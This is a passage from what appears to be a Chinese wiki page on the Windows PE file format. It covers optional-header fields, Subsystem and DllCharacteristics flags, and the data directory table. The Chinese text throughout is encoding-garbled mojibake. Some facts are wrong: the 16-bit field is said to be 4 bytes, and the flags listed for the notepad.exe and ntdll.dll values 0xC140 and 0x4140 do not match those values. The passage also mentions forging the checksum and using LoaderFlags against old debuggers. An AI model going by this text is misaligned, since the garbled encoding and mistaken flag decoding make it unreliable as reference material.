å°„çš„å¤§å°ï¼Œå¯æ¯”å®é™…çš„å€¼å¤§ã€‚æ˜¯æŒ‡æ–‡ä»¶è½½å…¥å†…å­˜åä»ImageBaseå¼€å§‹åˆ°æœ€åä¸€ä¸ªå—çš„å¤§å°ï¼ˆæœ€åä¸€ä¸ªå—å·²å‘ä¸Šå¯¹é½ï¼‰ã€‚è¯¥å€¼æ˜¯SectionAlignmentçš„æ•´æ•°å€ã€‚ SizeOfHeadersï¼šDOSå¤´+PEæ–‡ä»¶å¤´+èŠ‚è¡¨æŒ‰ç…§æ–‡ä»¶å¯¹é½åçš„å¤§å°ã€‚æ¯”å¦‚æ–‡ä»¶å¯¹é½å¤§å°æ˜¯0x200hï¼ŒDOSå¤´+PEå¤´+èŠ‚è¡¨çš„æ€»å¤§å°åŠ èµ·æ¥ç›®å‰æ˜¯0x302hï¼Œè¦å¯¹é½ï¼Œæ‰€ä»¥æœ€ç»ˆæ˜¯0x400hã€‚å³SizeOfHeadersçš„å€¼è¦æ˜¯FileAlignmentçš„æ•´æ•°å€ã€‚ CheckSumï¼šè¯¥PEæ–‡ä»¶çš„æ£€éªŒå’Œã€‚è¯¥å­—æ®µä¸æ˜¯æ‰€æœ‰çš„æ–‡ä»¶éƒ½æœ‰ï¼Œå¾€å¾€æ˜¯ç³»ç»Ÿä¸­ä¸€äº›é‡è¦çš„dllã€sysæœ‰è¿™ä¸ªå€¼ï¼Œæ˜¯æ“ä½œç³»ç»Ÿç”¨æ¥åˆ¤æ–­è¿™ä¸ªæ–‡ä»¶æ˜¯å¦è¢«äººä¿®æ”¹ã€‚ è®¡ç®—æ–¹æ³•ï¼šæ–‡ä»¶ä¸­ä¸¤ä¸ªå­—èŠ‚ä¸¤ä¸ªå­—èŠ‚åœ°ç›¸åŠ ï¼Œå†+æ–‡ä»¶é•¿åº¦ï¼ˆæº¢å‡ºæ— æ‰€è°“ï¼‰ï¼Œæœ€ç»ˆçš„å€¼å°±æ˜¯æ ¡éªŒå’Œã€‚æ¯”å¦‚ï¼Œ0x5A4Dh+ä¸‹ä¸¤ä¸ªå­—èŠ‚+â€¦+ä¸‹ä¸¤ä¸ªå­—èŠ‚ ä½†è¿™ä¸ªå€¼è¾¾ä¸åˆ°æ£€éªŒä¸€ä¸ªæ–‡ä»¶æ˜¯å¦è¢«ç¯¡æ”¹çš„åŠŸèƒ½ã€‚å› ä¸ºè®¡ç®—æ–¹æ³•å…¬å¼€ï¼Œè€Œä¸”å¾®è½¯ä¹Ÿæä¾›äº†ç°æˆçš„apiæ¥è®¡ç®—æ ¡éªŒå’Œã€‚æ”»å‡»è€…å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œé¡ºæ‰‹æŠŠChekSumè®¡ç®—ä¸€ä¸‹ï¼Œä¹Ÿæ”¹äº†å°±å¥½äº†ã€‚ Subsystemï¼šè¡¨æ˜å¯æ‰§è¡Œæ–‡ä»¶çš„å­ç³»ç»Ÿï¼Œå³æŒ‡å®šäº†æŒ‡å®šäº†å¯æ‰§è¡Œæ–‡ä»¶çš„è¿è¡Œç¯å¢ƒã€‚å®ƒå‘Šè¯‰æ“ä½œç³»ç»Ÿå¦‚ä½•ç®¡ç†å’Œæ‰§è¡Œè¯¥ç¨‹åºã€‚è¿™ä¸ªå­—æ®µçš„å€¼å†³å®šäº†ç¨‹åºçš„ç•Œé¢ç±»å‹ï¼Œæ¯”å¦‚æ˜¯å‘½ä»¤è¡Œå·¥å…·ã€å›¾å½¢ç•Œé¢åº”ç”¨ç¨‹åºè¿˜æ˜¯å…¶ä»–ç±»å‹çš„ç¨‹åºã€‚è¯¥å­—æ®µæ˜¯ä¸ªæšä¸¾ç±»å‹ã€‚ å€¼ å­ç³»ç»Ÿ 0 æœªçŸ¥ 1 ä¸éœ€è¦å­ç³»ç»Ÿï¼ˆä¾‹å¦‚é©±åŠ¨ç¨‹åºï¼‰ 2 å›¾å½¢æ¥å£å­ç³»ç»Ÿï¼ˆGUIï¼‰ï¼Œè¡¨ç¤ºç¨‹åºè¿è¡Œåœ¨Windowså›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰ä¸‹ 3 å­—ç¬¦å­ç³»ç»Ÿï¼ˆCUIï¼‰ï¼Œè¡¨ç¤ºç¨‹åºæ˜¯ä¸€ä¸ªæ§åˆ¶å°åº”ç”¨ç¨‹åºï¼Œè¿è¡Œåœ¨å‘½ä»¤è¡Œç•Œé¢(CUIï¼Œå³Console User Interface) 5 OS/2å­—ç¬¦å­ç³»ç»Ÿ 7 POSIXå­—ç¬¦å­ç³»ç»Ÿï¼Œè¡¨ç¤ºç¨‹åºéµå¾ªPOSIXæ ‡å‡†çš„æ§åˆ¶å°åº”ç”¨ç¨‹åº 8 ä¿ç•™ 9 Windows CEå›¾å½¢ç•Œé¢ï¼Œè¡¨ç¤ºç¨‹åºæ˜¯ä¸ºWindows CEè®¾è®¡çš„å›¾å½¢ç•Œé¢åº”ç”¨ç¨‹åº 10 è¡¨ç¤ºç¨‹åºæ˜¯ä¸€ä¸ªEFI(å¯æ‰©å±•å›ºä»¶æ¥å£)åº”ç”¨ç¨‹åºã€‚ é©±åŠ¨ç¨‹åº(1)ã€å›¾å½¢ç•Œé¢(2) ã€æ§åˆ¶å°/DLL(3)ã€‚æ‰€æœ‰çš„å€¼å¦‚ä¸‹ï¼š 123456789101112131415#define IMAGE_SUBSYSTEM_UNKNOWN 0 // Unknown subsystem.#define IMAGE_SUBSYSTEM_NATIVE 1 // Image doesn&#x27;t require a subsystem.#define IMAGE_SUBSYSTEM_WINDOWS_GUI 2 // Image runs in the Windows GUI subsystem.#define IMAGE_SUBSYSTEM_WINDOWS_CUI 3 // Image runs in the Windows character subsystem.#define IMAGE_SUBSYSTEM_OS2_CUI 5 // image runs in the OS/2 character subsystem.#define IMAGE_SUBSYSTEM_POSIX_CUI 7 // image runs in the Posix character subsystem.#define IMAGE_SUBSYSTEM_NATIVE_WINDOWS 8 // image is a native Win9x driver.#define IMAGE_SUBSYSTEM_WINDOWS_CE_GUI 9 // Image runs in the Windows CE subsystem.#define IMAGE_SUBSYSTEM_EFI_APPLICATION 10 //#define IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER 11 //#define IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER 12 //#define IMAGE_SUBSYSTEM_EFI_ROM 13#define IMAGE_SUBSYSTEM_XBOX 14#define IMAGE_SUBSYSTEM_WINDOWS_BOOT_APPLICATION 16#define IMAGE_SUBSYSTEM_XBOX_CODE_CATALOG 17 DllCharacteristicsï¼šæŒ‡å®šäº†PEæ–‡ä»¶çš„ä¸€äº›ç‰¹æ€§å’Œè¡Œä¸ºã€‚ä¸è¦è¢«åå­—æ‰€è¿·æƒ‘ï¼Œå®ƒä¸æ˜¯åªé’ˆå¯¹DLLæ–‡ä»¶çš„ï¼Œæ˜¯å¯¹PEæ–‡ä»¶çš„ã€‚è¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ªä½æ©ç ï¼Œå¯ä»¥é€šè¿‡å¯¹è¿™ä¸ªå€¼è¿›è¡Œä½è¿ç®—æ¥ç¡®å®šè®¾ç½®äº†å“ªäº›æ ‡å¿—ã€‚å®ƒçš„æ•°æ®å®½åº¦æ˜¯16ä½ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œå…¶æ¯ä¸€æ•°æ®ä½å¯¹åº”çš„å±æ€§å¦‚ä¸‹æ‰€ç¤ºï¼š æ•°æ®ä½ å¸¸é‡ç¬¦å· å«ä¹‰ 0x0001 IMAGE_LIBRARY_PROCESS_INIT Reserved 0x0002 IMAGE_LIBRARY_PROCESS_TERM Reserved 0x0004 IMAGE_LIBRARY_THREAD_INIT Reserved 0x0008 IMAGE_LIBRARY_THREAD_TERM Reserved 0x0020 IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA æ”¯æŒé«˜ç†µçš„åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰ 0x0040 IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE å¯ä»¥åœ¨å†…å­˜ä¸­éšæœºä½ç½®åŠ è½½ï¼Œæ”¯æŒåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰ 0x0080 IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY å¿…é¡»è¿›è¡Œç­¾åæ ¡éªŒ 0x0100 IMAGE_DLLCHARACTERISTICS_NX_COMPAT æ”¯æŒæ•°æ®æ‰§è¡Œé˜²æ­¢ï¼ˆDEPï¼‰ 0x0200 IMAGE_DLLCHARACTERISTICS_NO_ISOLATION ä¸æ˜¯éš”ç¦»çš„ã€‚è¿™ä¸ªæ ‡å¿—ä½æŒ‡ç¤ºPEæ–‡ä»¶ä¸ä½¿ç”¨Windowsèµ„æºéš”ç¦»æœºåˆ¶ã€‚èµ„æºéš”ç¦»æœºåˆ¶æ˜¯ä¸€ç§å…è®¸å¼€å‘è€…ä¸ºä¸åŒçš„åŒºåŸŸè®¾ç½®æˆ–è¯­è¨€ç‰ˆæœ¬çš„åº”ç”¨ç¨‹åºæä¾›ç‰¹å®šèµ„æºï¼ˆå¦‚å­—ç¬¦ä¸²ã€å›¾æ ‡ç­‰ï¼‰çš„æŠ€æœ¯ã€‚å¦‚æœè®¾ç½®äº† NO_ISOLATION æ ‡å¿—ï¼Œå®ƒè¡¨æ˜è¯¥PEæ–‡ä»¶ä¸ä½¿ç”¨è¿™ç§éš”ç¦»æœºåˆ¶ï¼Œå¯èƒ½æ˜¯å› ä¸ºå®ƒä¸åŒ…å«ä»»ä½•æœ¬åœ°åŒ–èµ„æºï¼Œæˆ–è€…å®ƒä½¿ç”¨äº†å…¶ä»–æœºåˆ¶æ¥å¤„ç†èµ„æºã€‚ 0x0400 IMAGE_DLLCHARACTERISTICS_NO_SEH ä¸ä½¿ç”¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆSEHï¼‰ã€‚æ²¡æœ‰SEHçš„DLLæ›´å®‰å…¨ï¼Œå› ä¸ºå®ƒä»¬ä¸ä¼šè¢«å¼‚å¸¸å¤„ç†ç›¸å…³çš„æ”»å‡»æ‰€åˆ©ç”¨ã€‚ 0x0800 IMAGE_DLLCHARACTERISTICS_NO_BIND è¡¨ç¤ºä¸å…è®¸å¯¹è¯¥PEæ–‡ä»¶è¿›è¡Œç»‘å®šã€‚ç»‘å®šæ˜¯ä¸€ç§ä¼˜åŒ–æŠ€æœ¯ï¼Œå®ƒåœ¨PEæ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯DLLï¼‰è¢«åŠ è½½æ—¶å‡å°‘äº†è§£æå¯¼å…¥å‡½æ•°åœ°å€æ‰€éœ€çš„æ—¶é—´ã€‚å½“ä¸€ä¸ªDLLè¢«ç»‘å®šåˆ°ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå®ƒçš„å¯¼å…¥åœ°å€è¡¨ï¼ˆIATï¼‰ä¼šè¢«é¢„å…ˆå¡«å……å…·ä½“çš„åœ°å€ï¼Œè€Œä¸æ˜¯åœ¨è¿è¡Œæ—¶è§£æã€‚å¦‚æœè®¾ç½®äº† NO_BIND æ ‡å¿—ï¼Œå®ƒè¡¨æ˜è¯¥PEæ–‡ä»¶ä¸åº”è¯¥è¢«ç»‘å®šã€‚è¿™å¯èƒ½æ˜¯å› ä¸ºå¼€å‘è€…å¸Œæœ›ç¡®ä¿å¯¼å…¥çš„åœ°å€æ€»æ˜¯åœ¨è¿è¡Œæ—¶è§£æï¼Œä»¥ä¾¿äºæ›´æ–°æˆ–å®‰å…¨æ€§è€ƒè™‘ã€‚ 0x1000 IMAGE_DLLCHARACTERISTICS_APPCONTAINER è¡¨ç¤ºè¯¥PEæ–‡ä»¶æ˜¯ä¸ºè¿è¡Œåœ¨AppContainerä¸­çš„åº”ç”¨ç¨‹åºè®¾è®¡çš„ã€‚AppContaineræ˜¯ä¸€ç§æ²™ç®±æœºåˆ¶ï¼Œç”±Windows 8å’Œæ›´é«˜ç‰ˆæœ¬çš„Windowsæ“ä½œç³»ç»Ÿæä¾›ï¼Œç”¨äºé™åˆ¶åº”ç”¨ç¨‹åºçš„æƒé™ï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚å½“è¿™ä¸ªæ ‡å¿—è¢«è®¾ç½®æ—¶ï¼Œå®ƒè¡¨æ˜è¯¥ç¨‹åºæˆ–åº“è¢«è®¾è®¡ä¸ºåœ¨è¿™ç§å—é™çš„æ‰§è¡Œç¯å¢ƒä¸­è¿è¡Œï¼Œé€šå¸¸ç”¨äºç°ä»£çš„Windows Storeåº”ç”¨ã€‚ 0x2000 IMAGE_DLLCHARACTERISTICS_WDM_DRIVER è¡¨ç¤ºè¯¥PEæ–‡ä»¶æ˜¯ä¸€ä¸ªWDMé©±åŠ¨ç¨‹åº 0x4000 IMAGE_DLLCHARACTERISTICS_GUARD_CF è¡¨ç¤ºè¯¥PEæ–‡ä»¶æ”¯æŒæ§åˆ¶æµä¿æŠ¤ã€‚æ§åˆ¶æµä¿æŠ¤ï¼ˆControl Flow Guard, CFGï¼‰æ˜¯ä¸€ç§ç”±Microsoftå¼€å‘çš„å®‰å…¨ç‰¹æ€§ï¼Œç”¨äºé˜²æ­¢å†…å­˜æŸåæ¼æ´è¢«åˆ©ç”¨ï¼Œç‰¹åˆ«æ˜¯é‚£äº›å¯èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œæµç¨‹è¢«æ¶æ„ç¯¡æ”¹çš„æ¼æ´ã€‚å½“è®¾ç½®äº† GUARD_CF æ ‡å¿—æ—¶ï¼Œå®ƒè¡¨æ˜PEæ–‡ä»¶å·²ç»ä½¿ç”¨CFGè¿›è¡Œäº†ç¼–è¯‘å’Œé“¾æ¥ï¼Œæ“ä½œç³»ç»ŸåŠ è½½å™¨å°†ä¼šå¯ç”¨CFGï¼Œä»¥å¢åŠ å¯¹æ”»å‡»è€…åˆ©ç”¨æœªç»éªŒè¯æˆ–ä¸å®‰å…¨çš„é—´æ¥å‡½æ•°è°ƒç”¨çš„é˜²æŠ¤ã€‚ 0x8000 IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE è¡¨ç¤ºè¯¥PEæ–‡ä»¶æ˜¯ç»ˆç«¯æœåŠ¡å…¼å®¹çš„ åˆ¶ä½œè¡¨æ ¼å‚è€ƒçš„å›¾å’Œæšä¸¾å¸¸é‡1234567891011121314// IMAGE_LIBRARY_PROCESS_INIT 0x0001 // Reserved.// IMAGE_LIBRARY_PROCESS_TERM 0x0002 // Reserved.// IMAGE_LIBRARY_THREAD_INIT 0x0004 // Reserved.// IMAGE_LIBRARY_THREAD_TERM 0x0008 // Reserved.#define IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA 0x0020 // Image can handle a high entropy 64-bit virtual address space.#define IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 0x0040 // DLL can move.#define IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY 0x0080 // Code Integrity Image#define IMAGE_DLLCHARACTERISTICS_NX_COMPAT 0x0100 // Image is NX compatible#define IMAGE_DLLCHARACTERISTICS_NO_ISOLATION 0x0200 // Image understands isolation and doesn&#x27;t want it#define IMAGE_DLLCHARACTERISTICS_NO_SEH 0x0400 // Image does not use SEH. No SE handler may reside in this image#define IMAGE_DLLCHARACTERISTICS_NO_BIND 0x0800 // Do not bind this image.#define IMAGE_DLLCHARACTERISTICS_APPCONTAINER 0x1000 // Image should execute in an AppContainer#define IMAGE_DLLCHARACTERISTICS_WDM_DRIVER 0x2000 // Driver uses WDM model#define IMAGE_DLLCHARACTERISTICS_GUARD_CF 0x4000 // Image supports Control Flow Guard. ä¾‹ win10ä¸‹æ‰¾ä¸€ä¸ªexeå’Œdllçœ‹ä¸‹è¿™ä¸ªä½notepad.exentdll.dllsubsystemï¼š2hï¼ŒGUIç•Œé¢ç¨‹åºDllCharacteristicsï¼š0xC140hè¢«è®¾ç½®çš„ä½å«ä¹‰IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE (0x0040)æ”¯æŒASLRIMAGE_DLLCHARACTERISTICS_NX_COMPAT (0x0100)æ”¯æŒDEPIMAGE_DLLCHARACTERISTICS_NO_ISOLATION (0x0200)ä¸æ˜¯éš”ç¦»çš„IMAGE_DLLCHARACTERISTICS_NO_SEH (0x0400)ä¸ä½¿ç”¨SEHIMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE (0x8000)ç»ˆç«¯æœåŠ¡å™¨å…¼å®¹ï¼Œæ„å‘³ç€å¯ä»¥åœ¨è¿œç¨‹æ¡Œé¢ä¼šè¯ä¸­æ­£å¸¸å·¥ä½œsubsystemï¼š3hï¼Œæ§åˆ¶å°/DLLDllCharacteristicsï¼š0x4140hè¢«è®¾ç½®çš„ä½å«ä¹‰IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE (0x0040)æ”¯æŒASLRIMAGE_DLLCHARACTERISTICS_NX_COMPAT (0x0100)æ”¯æŒDEPIMAGE_DLLCHARACTERISTICS_NO_SEH (0x0400)ä¸ä½¿ç”¨SEH SizeOfStackReserveï¼šåœ¨EXEæ–‡ä»¶é‡Œï¼Œåˆå§‹åŒ–æ—¶ä¸ºçº¿ç¨‹ä¿ç•™çš„æ ˆçš„å¤§å°ã€‚å®ƒåœ¨ä¸€å¼€å§‹åªæäº¤å…¶ä¸­ä¸€éƒ¨åˆ†ï¼Œåªæœ‰åœ¨å¿…è¦æ—¶æ‰æäº¤å‰©ä¸‹çš„éƒ¨åˆ†ã€‚ SizeOfStackCommitï¼šåœ¨EXEæ–‡ä»¶é‡Œï¼Œåˆå§‹åŒ–æ—¶å®é™…æäº¤çš„æ ˆçš„å¤§å°ï¼Œé»˜è®¤å€¼æ˜¯4KBã€‚ SizeOfHeapReserveï¼šåœ¨EXEæ–‡ä»¶é‡Œï¼Œåˆå§‹åŒ–æ—¶ä¸ºçº¿ç¨‹é»˜è®¤ä¿ç•™çš„å †çš„å¤§å°ï¼Œé»˜è®¤å€¼æ˜¯1MBã€‚ SizeOfHeapCommitï¼šåœ¨EXEæ–‡ä»¶é‡Œï¼Œåˆå§‹åŒ–æ—¶å®é™…æäº¤çš„å †çš„å°å°ï¼Œé»˜è®¤å€¼æ˜¯4KB LoaderFlagsï¼šä¸è°ƒè¯•æœ‰å…³ï¼Œé»˜è®¤å€¼ä¸º0ã€‚Reserved, must be zero.ï¼ˆMSDNï¼‰ã€‚è¢«åºŸå¼ƒçš„æˆå‘˜å€¼ï¼ŒMSDNä¸ŠåŸè¯ä¸ºâ€œThis member is obsoleteâ€ã€‚ä½†æ˜¯è¯¥å€¼åœ¨æŸäº›æƒ…å†µä¸‹è¿˜æ˜¯ä¼šè¢«ç”¨åˆ°çš„ï¼Œæ¯”å¦‚é’ˆå¯¹åŸå§‹çš„ä½ç‰ˆæœ¬çš„ODæ¥è¯´ï¼Œä¿®æ”¹è¯¥å€¼ä¼šèµ·åˆ°åè°ƒè¯•çš„ä½œç”¨ã€‚ NumberOfRvaAndSizesï¼šæ•°æ®ç›®å½•è¡¨çš„ä¸ªæ•°ã€‚è¿™ä¸ªå­—æ®µçš„å€¼ä»Windows NT å‘å¸ƒä»¥æ¥ä¸€ç›´æ˜¯16ã€‚ DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]ï¼šæ•°æ®ç›®å½•è¡¨ï¼Œæ˜¯ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæ¯ä¸ªæˆå‘˜æ˜¯IMAGE_DATA_DIRECTORYç»“æ„ä½“ã€‚ä¸åŒçš„ç´¢å¼•æ˜¯ä¸åŒçš„è¡¨ã€‚è¯¥å­—æ®µæ˜¯ä¸ªæšä¸¾ç±»å‹ã€‚ 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; VirtualAddressï¼šè¿™å¼ è¡¨èµ·å§‹åœ°å€ï¼Œè¿™ä¸ªå€¼æ˜¯RVA æƒ³åœ¨æ–‡ä»¶ä¸­æ‰¾ï¼Œè¿˜éœ€è½¬æˆFOA Sizeï¼šè¡¨çš„å¤§å°ã€‚ æ˜¯æŒ‡IMAGE_DATA_DIRECTORYç»“æ„ä½“å’Œå…¶ä½¿ç”¨çš„æ‰€æœ‰æ•°æ®ä¹‹å’Œï¼ˆæ¯”å¦‚å¯¼å‡ºè¡¨é‡Œæœ‰æŒ‡é’ˆï¼Œè¦ç®—ä¸Šè¿™ä¸ªæŒ‡é’ˆå…¶æŒ‡å‘å­è¡¨æ‰€å ç”¨çš„ç©ºé—´ï¼‰ è¿™ä¸ªå€¼æ˜¯ç¼–è¯‘å™¨ç¼–è¯‘å®Œå¡«å†™çš„å€¼ï¼Œæ²¡æœ‰å®é™…æ„ä¹‰ã€‚è¯¥å€¼ä¸ä¼šå½±å“ç¨‹åºçš„è¿è¡Œï¼ˆæ²¡å°è¯•ä¿®æ”¹éªŒè¯è¿‡ï¼Ÿï¼‰ åºå· æˆå‘˜ ç»“æ„ åç§»é‡ï¼ˆPEï¼‰ åç§»é‡PE32+ 0 Export Table IMAGE_DIRECTORY_ENTRY_EXPORT 78h 88h 1 Import Table IMAGE_DIRECTORY_ENTRY_IMPORT 80h 90h 2 Resources Table IMAGE_DIRECTORY_ENTRY_RESOURCE 88h 98h 3 Exception Table IMAGE_DIRECTORY_ENTRY_EXCEPTION 90h A0h 4 Security Table IMAGE_DIRECTORY_ENTRY_SECURITY 98h A8h 5 Base relocation Table IMAGE_DIRECTORY_ENTRY_BASERELOC A0h B0h 6 Debug IMAGE_DIRECTORY_ENTRY_DEBUG A8h B8h 7 Copyright IMAGE_DIRECTORY_ENTRY_ARCHITECTURE B0h C0h 8 Global Ptr IMAGE_DIRECTORY_ENTRY_GLOBALPTR B8h C8h 9 Thread local storage(TLS) IMAGE_DIRECTORY_ENTRY_TLS C0h D0h 10 Load configuration IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG C8h D8h 11 Bound Import IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT D0h E0h 12 Import Address Table(IAT) IMAGE_DIRECTORY_ENTRY_IAT D8h E8h 13 Delay Import IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT E0h F0h 14 COM descriptor IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR E8h F8h 15 ä¿ç•™ï¼Œå¿…é¡»ä¸º0 F0h 100h 12345678910111213141516#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory#define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory#define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table#define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory// IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage)#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP#define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers#define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor"},{"title":"Overview","path":"/wiki/PE/Overview_PE.html","content":"å¯æ‰§è¡Œæ–‡ä»¶(executable file)æŒ‡çš„æ˜¯å¯ä»¥ç”±æ“ä½œç³»ç»Ÿè¿›è¡ŒåŠ è½½æ‰§è¡Œçš„æ–‡ä»¶ã€‚ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æƒ³è¢«æ“ä½œç³»ç»ŸåŠ è½½å™¨åŠ è½½åˆ°å†…å­˜ä¸­æ‰§è¡Œï¼Œå®ƒéœ€è¦æŒ‰ç…§è¦æ±‚çš„æ–‡ä»¶è§„èŒƒå¯¹ä¿¡æ¯è¿›è¡Œå­˜æ”¾ï¼Œä¸åŒç³»ç»Ÿä¸Šå¯æ‰§è¡Œæ–‡ä»¶çš„æ ¼å¼å¦‚ä¸‹ï¼š Windowså¹³å°ï¼šPEï¼ˆPortable Executableï¼‰æ–‡ä»¶ç»“æ„ Linuxå¹³å°:ï¼šELFï¼ˆExecutable and Linking Formatï¼‰æ–‡ä»¶ç»“æ„ ä»â€œPortable Executableâ€å¯ä»¥çœ‹å‡ºå¾®è½¯è®¾è®¡çš„ç›®çš„ï¼Œç³»ç»Ÿæœ‰ä¸€ä¸ªé€šç”¨äºæ‰€æœ‰Windowså¹³å°å’ŒCPUï¼ˆx86ï¼ŒMIPSã€Alphaç­‰ï¼‰çš„æ–‡ä»¶æ ¼å¼ã€‚ å­¦ä¹ PEæ–‡ä»¶å°±æ˜¯å­¦ä¹ æ–‡ä»¶æ ¼å¼ï¼Œç»„ç»‡è¿™äº›æ•°æ®çš„è§„èŒƒã€‚å¤´æ–‡ä»¶winnt.hä¸­æè¿°äº†PEåŠCOFFæ ¼å¼ç›¸å…³çš„æ•°æ®ç»“æ„å®šä¹‰ã€æšä¸¾ç±»å‹ã€å¸¸é‡å®šä¹‰ã€‚å®˜æ–¹æ–‡æ¡£PE Formatã€‚ PEæŒ‡çº¹ åœ¨Windowså¹³å°ï¼ˆåŒ…æ‹¬ Win 9xã€Win NTã€Win CEâ€¦â€¦ï¼‰ä¸‹ï¼Œæ‰€æœ‰çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆåŒ…æ‹¬EXEæ–‡ä»¶ã€DLLæ–‡ä»¶ã€SYSæ–‡ä»¶ã€OCX æ–‡ä»¶ã€COMæ–‡ä»¶â€¦â€¦ï¼‰å‡ä½¿ç”¨PEæ–‡ä»¶ç»“æ„ã€‚è¿™äº›ä½¿ç”¨PEæ–‡ä»¶ç»“æ„çš„å¯æ‰§è¡Œæ–‡ä»¶ä¹Ÿç§°ä¸ºPEæ–‡ä»¶ã€‚ æ‘˜è‡ªã€ŠC++é»‘å®¢ç¼–ç¨‹æ­ç§˜ä¸é˜²èŒƒ(ç¬¬3ç‰ˆ)ã€‹ åˆ¤æ–­ä¸€ä¸ªæ–‡ä»¶æ˜¯å¦æ˜¯PEæ ¼å¼ï¼Œä¸èƒ½ä»…å‡­å€Ÿæ–‡ä»¶çš„æ‰©å±•åæ¥ç¡®å®šã€‚æ–‡ä»¶æ‰©å±•åæ˜¯å¯ä»¥ä»»æ„æ›´æ”¹çš„ï¼Œå®ƒä»…ä»…æ˜¯æ“ä½œç³»ç»Ÿç”¨æ¥å¸®åŠ©ç”¨æˆ·æ›´ä¾¿æ·åœ°é€šè¿‡ç‰¹å®šåº”ç”¨ç¨‹åºæ‰“å¼€æ–‡ä»¶çš„æ ‡è¯†ã€‚ä¾‹å¦‚ï¼Œåœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œå¦‚æœæŒ‡å®špotplayerç¨‹åºæ¥æ‰“å¼€.mp4æ–‡ä»¶ï¼Œé‚£ä¹ˆç”¨æˆ·åŒå‡»ä»»ä½•ä¸€ä¸ª.mp4æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šè‡ªåŠ¨ç”¨potplayeræ¥æ‰“å¼€å®ƒã€‚å³ä½¿å°†.mp4æ–‡ä»¶çš„æ‰©å±•åæ›´æ”¹ä¸º.bacæˆ–å…¶ä»–æ— å…³çš„æ‰©å±•åï¼Œåªè¦åœ¨æ‰“å¼€æ–‡ä»¶çš„æ–¹å¼ä¸­é€‰æ‹©potplayerï¼Œæ–‡ä»¶ä¾ç„¶å¯ä»¥è¢«æ‰“å¼€ã€‚è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆé€šå¸¸æˆ‘ä»¬ä¸ä¼šéšæ„æ›´æ”¹æ–‡ä»¶çš„æ‰©å±•åï¼Œå› ä¸ºè¿™æ ·åšæœ‰åŠ©äºæˆ‘ä»¬æ›´æ–¹ä¾¿åœ°ä½¿ç”¨æ–‡ä»¶ã€‚ æ­£ç¡®è¾¨åˆ«PEæ–‡ä»¶çš„æ–¹æ³•æ˜¯é€šè¿‡äºŒè¿›åˆ¶ç¼–è¾‘å·¥å…·ï¼ˆä¾‹å¦‚WinHexã€UEã€010 Editorç­‰ï¼‰æ‰“å¼€æ–‡ä»¶è¿›è¡Œæ£€æŸ¥ï¼š é¦–å…ˆè§‚å¯Ÿæ–‡ä»¶å¼€å¤´çš„ä¸¤ä¸ªå­—èŠ‚æ˜¯å¦ä¸º0x4Då’Œ0x5Aï¼Œè¿™ä¸¤ä¸ªå­—èŠ‚çš„åå…­è¿›åˆ¶è¡¨ç¤ºä¸º0x5A4Dï¼Œå¯¹åº”çš„ASCIIå­—ç¬¦æ˜¯&quot;MZ&quot; æ 